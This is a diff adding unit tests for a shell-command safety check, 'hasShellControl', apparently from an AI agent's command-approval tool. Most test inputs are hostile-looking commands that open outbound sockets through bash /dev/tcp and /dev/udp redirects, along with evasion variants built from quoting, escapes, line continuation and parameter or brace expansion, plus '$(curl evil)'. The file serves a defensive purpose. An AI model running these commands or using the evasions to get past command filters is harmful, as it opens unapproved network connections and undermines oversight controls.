@@ -134,6 +134,18 @@ describe('hasShellControl - #1023 quote-aware veto', () => {
     expect(hasShellControl("echo 'a > b")).toBe(true);
   });
 
+  test('MUST VETO: backslash-newline line continuation (bash deletes it pre-token)', () => {
+    // bash's input reader removes `\<newline>` before tokenization, so it can
+    // synthesize `/dev/tcp` (`/dev/t\<nl>cp`) or split the `$(` substitution
+    // veto (`$\<nl>(whoami)` = RCE). maskQuotedSpans masks the pair to `__`, a
+    // two-char desync. Fail closed on the raw pair until #1065 normalizes it.
+    expect(hasShellControl('cat < /dev/t\\\ncp/127.0.0.1/1')).toBe(true);
+    expect(hasShellControl('cat $\\\n(whoami)')).toBe(true);
+    expect(hasShellControl('cat <\\\n/dev/tcp/h/p')).toBe(true);
+    // A plain (non-continued) command is unaffected.
+    expect(hasShellControl('cat < /dev/null')).toBe(false);
+  });
+
   test('MUST STILL VETO: real shell control survives alongside masked prose', () => {
     // The `--body` prose is inert, but the trailing `$(...)` outside any
     // quote is a real command substitution and must still veto the whole
@@ -141,5 +153,169 @@ describe('hasShellControl - #1023 quote-aware veto', () => {
     expect(hasShellControl('gh issue create --body "a > b and a \\` mention" $(curl evil)')).toBe(
       true,
     );
+  });
+});
+
+// #1063: input redirection FROM a bash network device opens an OUTBOUND socket
+// and must veto on the matched-segment path, not only on the while-loop
+// grammar residue where the C6 fix (#1062) first added the guard.
+describe('hasShellControl - #1063 network-device input redirect', () => {
+  test('MUST VETO: input redirect from /dev/tcp and /dev/udp', () => {
+    expect(hasShellControl('cat < /dev/tcp/evil/443')).toBe(true);
+    expect(hasShellControl('cat < /dev/udp/host/53')).toBe(true);
+  });
+
+  test('MUST VETO: the fd-numbered and no-space spellings', () => {
+    expect(hasShellControl('cat 0< /dev/tcp/h/1')).toBe(true);
+    expect(hasShellControl('cat 3< /dev/tcp/h/1')).toBe(true);
+    expect(hasShellControl('cat</dev/tcp/h/1')).toBe(true);
+  });
+
+  test('MUST VETO: quoting or escaping the target does not hide the socket', () => {
+    // The check runs on the quote-removed `shellWords` target, not the masked
+    // text -- a single quote or backslash defeated a masked-text scan while
+    // bash still opened the socket (#1063 re-review). All of these socket in
+    // bash.
+    expect(hasShellControl('cat < "/dev/tcp/evil/443"')).toBe(true);
+    expect(hasShellControl("cat < '/dev/tcp/evil/443'")).toBe(true);
+    expect(hasShellControl('cat < /dev/"tcp"/evil/443')).toBe(true);
+    expect(hasShellControl('cat < /d\\ev/tcp/evil/443')).toBe(true);
+    expect(hasShellControl('cat<"/dev/tcp/h/1"')).toBe(true);
+  });
+
+  test('MUST VETO: a SECOND glued redirect to the device behind a benign first', () => {
+    // `cat /dev/null</dev/null</dev/tcp/H/P` opens the socket in bash (both
+    // redirects apply left-to-right); a greedy first-`<` capture read only
+    // `/dev/null` and approved it (#1063 second re-review). Every `<`-glued
+    // field must be checked.
+    expect(hasShellControl('cat /dev/null</dev/null</dev/tcp/127.0.0.1/1')).toBe(true);
+    expect(hasShellControl('cat a<b</dev/udp/h/53')).toBe(true);
+  });
+
+  test('MUST VETO: `<` glued to a word tail with the device in the next token', () => {
+    // bash treats `<` glued to the end of ANY word as a fresh stdin-redirect
+    // operator, target = next token: `cat foo< /dev/tcp/h/p` opens the socket.
+    // Recognizing only bare `<`/`N<` as operators missed it (#1063 third
+    // re-review). Every token ending in a single `<` is an operator.
+    expect(hasShellControl('cat foo< /dev/tcp/127.0.0.1/1')).toBe(true);
+    expect(hasShellControl('grep pat file< /dev/tcp/h/1')).toBe(true);
+    expect(hasShellControl('cat 2x< /dev/tcp/h/1')).toBe(true);
+    expect(hasShellControl('cat abc< /dev/udp/h/1')).toBe(true);
+    // ...but a word-glued `<` to an ordinary file is still fine.
+    expect(hasShellControl('cat foo< data.txt')).toBe(false);
+  });
+
+  test('MUST VETO: a quoted/escaped literal `<` glued before the real operator', () => {
+    // `cat 'x<'< /dev/tcp/h/p`: the quoted `x<` is a literal ARGUMENT, the
+    // trailing `<` is the live operator. shellWords concatenated them into the
+    // token `x<<`, read as a heredoc and skipped, opening the socket (#1063
+    // fifth re-review). Operator position now comes from the masked view,
+    // where the quoted `<` is `_` and cannot glue onto the operator.
+    expect(hasShellControl("cat 'x<'< /dev/tcp/127.0.0.1/1")).toBe(true);
+    expect(hasShellControl("cat '<'< /dev/tcp/h/p")).toBe(true);
+    expect(hasShellControl('cat \\<< /dev/tcp/h/p')).toBe(true);
+    // A quoted `<` INSIDE the target word must not fragment it (still a file).
+    expect(hasShellControl('cat < "a<b"')).toBe(false);
+  });
+
+  test('MUST NOT VETO: an ordinary file input redirect (reads, never sockets)', () => {
+    expect(hasShellControl('grep x < list.txt')).toBe(false);
+    expect(hasShellControl('cat < ./config.ini')).toBe(false);
+  });
+
+  test('MUST NOT VETO: benign /dev targets that are not sockets', () => {
+    expect(hasShellControl('cat < /dev/null')).toBe(false);
+    expect(hasShellControl('cat < /dev/stdin')).toBe(false);
+  });
+
+  test('a here-string of a /dev/tcp literal is not a socket open', () => {
+    // `<<<` feeds the literal string to stdin; bash does not apply network-
+    // device magic to here-strings, only to `<`/`>` redirections.
+    expect(hasShellControl('cat <<< /dev/tcp/h/p')).toBe(false);
+  });
+
+  test('the case/prefix variants bash treats as ordinary files are not vetoed here', () => {
+    // Only the exact case-sensitive `/dev/tcp/`|`/dev/udp/` prefix sockets in
+    // bash; these all fall to a file open, so refusing them would be noise.
+    expect(hasShellControl('cat < /DEV/TCP/h/1')).toBe(false);
+    expect(hasShellControl('cat < /dev/tcpx/h/1')).toBe(false);
+    expect(hasShellControl('cat < x/dev/tcp/h/1')).toBe(false);
+  });
+
+  test("MUST VETO: an ANSI-C $'...' input-redirect target (shellWords under-decodes it)", () => {
+    // `shellWords` copies the literal char after a `$'...'` escape's backslash
+    // (`\x2f` -> `x2f`), so the device prefix is corrupted and the anchored
+    // device check misses -- but bash fully decodes and opens the socket
+    // (#1063 fourth re-review). Fail closed on ANSI-C in a redirect context.
+    expect(hasShellControl("cat <$'\\x2fdev\\x2ftcp\\x2f127.0.0.1\\x2f1'")).toBe(true);
+    expect(hasShellControl("cat < $'/dev/tcp/h/p'")).toBe(true);
+    expect(hasShellControl("cat < /dev/tc$'\\x70'/h/p")).toBe(true);
+    expect(hasShellControl("cat foo<$'/dev/tcp/h/p'")).toBe(true);
+    // Locale `$"..."` is the same class: the dequote leaves a stray `$`, so the
+    // fail-closed rule covers both dollar-quote forms (#1063 fifth re-review).
+    expect(hasShellControl('cat < $"/dev/tcp/h/p"')).toBe(true);
+    expect(hasShellControl('cat foo< $"/dev/tcp/h/p"')).toBe(true);
+  });
+
+  test('MUST VETO: parameter expansion that materializes the device path', () => {
+    // bash expands a redirect target: an empty `$x` prefix (`$x/dev/tcp/...`)
+    // or infix (`/dev/t${x}cp/...`) opens the socket while the literal does not
+    // begin `/dev/tcp/`. The general rule -- a `$` in the target is
+    // unresolvable, so fail closed -- subsumes ANSI-C, locale, and this (#1063
+    // sixth re-review).
+    expect(hasShellControl('cat < $x/dev/tcp/127.0.0.1/1')).toBe(true);
+    expect(hasShellControl('cat < ${x}/dev/tcp/h/p')).toBe(true);
+    expect(hasShellControl('cat < /dev/t${x}cp/127.0.0.1/1')).toBe(true);
+    expect(hasShellControl('head < ${x}/dev/udp/h/1')).toBe(true);
+  });
+
+  test('MUST VETO: brace expansion that materializes the device path', () => {
+    // The brace RANGE `{p..p}` collapses to `p` with NO `$`, so `/dev/tc{p..p}`
+    // opens the socket -- the transformation that defeated the $-only rule
+    // (#1063 sixth re-review). Any `{` in the target now fails closed.
+    expect(hasShellControl('cat < /dev/tc{p..p}/127.0.0.1/9')).toBe(true);
+    expect(hasShellControl('cat < /d{e..e}v/tcp/h/p')).toBe(true);
+    expect(hasShellControl('grep x < /dev/tc{p,p}/h/p')).toBe(true);
+  });
+
+  test('MUST NOT VETO: glob and tilde targets (cannot synthesize the device)', () => {
+    // `/dev/tcp` is virtual (no directory entry) so a glob never matches it,
+    // and `~` expands to a home dir -- neither can form the device path, so
+    // they stay approvable (no over-refusal beyond `$`/`{`).
+    expect(hasShellControl('cat < /dev/tc?/h/p')).toBe(false);
+    expect(hasShellControl('cat < /dev/tc[p]/h/p')).toBe(false);
+    expect(hasShellControl('cat < ~/notes.txt')).toBe(false);
+  });
+
+  test('ACCEPTED over-refusal: a variable or brace input-redirect target escalates', () => {
+    // The fail-closed rule cannot tell `< $LOG` / `< a{1,2}.txt` from a
+    // device-synthesizing expansion, so it refuses both toward escalate. A
+    // `<`-redirect from a variable or brace path is uncommon and escalate is
+    // the safe direction; the reverse was a live socket. A `$`/`{` OUTSIDE the
+    // redirect target does not trigger it.
+    expect(hasShellControl('sort < $TMPFILE')).toBe(true);
+    expect(hasShellControl('cat < $HOME/notes.txt')).toBe(true);
+    expect(hasShellControl('cat < a{1,2}.txt')).toBe(true);
+  });
+
+  test('MUST NOT VETO: a dollar-quote with NO input redirect present', () => {
+    // The fail-closed rule needs a real (unmasked) input-redirect operator, so
+    // an ordinary dollar-quoted arg is untouched -- these are common idioms.
+    expect(hasShellControl("echo $'\\n'")).toBe(false);
+    expect(hasShellControl("grep $'\\t' f")).toBe(false);
+    expect(hasShellControl("printf $'%s\\n' a")).toBe(false);
+    expect(hasShellControl('echo $"hi"')).toBe(false);
+  });
+
+  test('MUST NOT VETO: a quoted device literal is NOT a redirect (masked-scan)', () => {
+    // Both the spaced (`'< /dev/tcp/x is bad'`) and the space-less
+    // (`'x</dev/tcp/y'`) forms are ONE grep argument: the `<` is quoted, so the
+    // masked view shows `_` where a literal `<` sits and never reads it as an
+    // operator. Deciding operator position from the masked view (not the
+    // quote-removed shellWords tokens) removed the over-refusal an earlier
+    // token-based cut had here, AND closed the `'x<'< /dev/tcp` operator-glue
+    // bypass -- the same architectural fix does both (#1063 fifth re-review).
+    expect(hasShellControl("grep '< /dev/tcp/x is bad' f")).toBe(false);
+    expect(hasShellControl("grep 'x</dev/tcp/y' f")).toBe(false);
   });
 });
